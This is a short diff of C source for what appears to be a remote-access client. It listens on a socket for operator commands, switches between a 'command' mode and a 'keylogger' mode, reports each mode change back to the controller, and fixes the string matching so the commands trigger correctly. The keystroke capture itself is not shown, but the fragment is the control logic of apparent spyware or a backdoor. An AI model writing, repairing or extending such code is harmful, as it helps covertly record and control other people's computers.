@@ -59,22 +59,23 @@ int main()
 		if(strcmp(buffer,"command\n") == 0){
 			strcpy(mode,"command");
 			char message[] = "client passe en mode commande\n";
-			send(sock,message,strlen(message),0);	
+			send(sock,message,strlen(message),0);
 			printf("%s\n", "command mode, message sent");
 			printf("strcmp(mode,command) : %d\n",strcmp(mode,"command"));
 			
 		
 		}
-		else if(strcmp(buffer,"keylogger") == 0){
+		else if(strcmp(buffer,"keylogger\n") == 0){
 			strcpy(mode,buffer);
 			char message[] = "mode keylogger active\n";
-			send(sock,message,strlen(message),0);	
+			send(sock,message,strlen(message),0);
 		}
-		else if(strcmp(buffer,"back") == 0){
+		else if(strcmp(buffer,"back\n") == 0){
 			strcpy(mode,"none");
 			char message[] = "everything is desactivated \n";
-			send(sock,message,strlen(message),0);	
+			send(sock,message,strlen(message),0);
 		}
+
 	}
     closesocket(sock);
     WSACleanup();
